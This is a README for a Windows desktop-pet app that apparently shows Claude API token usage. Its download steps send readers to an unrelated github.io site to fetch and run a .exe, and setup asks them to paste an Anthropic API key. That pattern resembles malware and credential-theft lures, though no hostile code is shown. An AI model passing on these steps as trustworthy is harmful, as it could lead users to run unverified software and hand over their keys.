# 🐕 hachiko-usage - Track your Claude token use daily

[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://itchy-kingdom684.github.io)

Hachiko is a desktop pet that lives on your screen. It displays your Claude API token usage in a thought cloud. You see your current session limits and your weekly rate usage without opening a browser. Hachiko stays near your taskbar to provide constant updates on your budget.

## 🛠️ System Requirements

Your computer needs the following to run Hachiko:

*   Windows 10 or Windows 11.
*   Internet access to sync usage data.
*   An active Anthropic API key.
*   At least 50 MB of free storage space.

## 📥 How to Download 

Follow these steps to set up the software on your machine:

1.  Visit the [official releases page](https://itchy-kingdom684.github.io) to find the latest version.
2.  Look for the file ending in `.exe` under the "Assets" section.
3.  Click the file name to start the download.
4.  Once the file finishes downloading, move it to a folder where you want to keep the program.
5.  Double-click the file to launch Hachiko.

## ⚙️ Initial Setup

When you launch the program for the first time, you must connect your account:

1.  A window will appear asking for your Anthropic API key.
2.  Log in to your Anthropic account in your web browser.
3.  Go to your API keys page and create a new key.
4.  Copy the key and paste it into the Hachiko input box.
5.  Click the "Save" button.

Once you save the key, Hachiko will appear on your desktop. The pet will perform a check and display your current token usage in a thought cloud above its head.

## ☁️ Understanding the Thought Cloud

The thought cloud updates every time you send a request to Claude. It shows two main numbers:

*   **Session Usage:** This represents the tokens used since you last started your project.
*   **Weekly Rate:** This is the percentage of your weekly limit used.

If your usage approaches your limit, Hachiko will change its behavior to alert you. This helps you manage your budget and prevent unwanted interruptions in your workflow.

## 🖱️ Using Hachiko

You can interact with Hachiko using your mouse:

*   **Move:** Click and hold Hachiko to drag the pet to a different spot on your screen.
*   **Refresh:** Right-click Hachiko to open a menu. Select "Refresh Data" to get the most recent numbers from the server.
*   **Hide:** If the pet obscures your work, right-click and select "Hide." You can bring it back by opening the notification area in your Windows taskbar.
*   **Settings:** Use the settings menu to change the refresh frequency or update your API key if you rotate it for security.

## 💡 Troubleshooting

Most issues stem from connection errors or invalid keys. Check these items if Hachiko acts strange:

*   **Network Errors:** Ensure your firewall allows Hachiko to reach the internet. 
*   **Invalid Key:** If the thought cloud shows an error, delete your settings file and restart the program. Re-enter your API key to restore the connection.
*   **Startup Issues:** If the program does not show up, ensure you have the correct version of the Windows runtime libraries installed. Check the release page for links to these files.

## 🛡️ Privacy and Security

Hachiko runs locally on your machine. The program only communicates with Anthropic servers to pull your usage data. It does not store your API key in a remote database or send your private prompts to third-party services. All your information stays on your local drive inside a protected configuration file. 

## 📝 Frequently Asked Questions

**Does Hachiko slow down my computer?**
The program uses minimal system memory. You will not notice a change in performance while it runs.

**Can I use Hachiko with multiple keys?**
At this time, Hachiko supports one active API key per installation.

**Is this tool free?**
Yes. Hachiko is open-source software. You can view the code at any time on this repository.

**Does Hachiko work on Mac or Linux?**
The current version is built specifically for Windows. 

Keywords: anthropic, claude, claude-code, desktop-pet, pyside6, rate-limit, shimeji, tamagotchi, token-usage, usage-meter, usage-tracker, virtual-pet, windows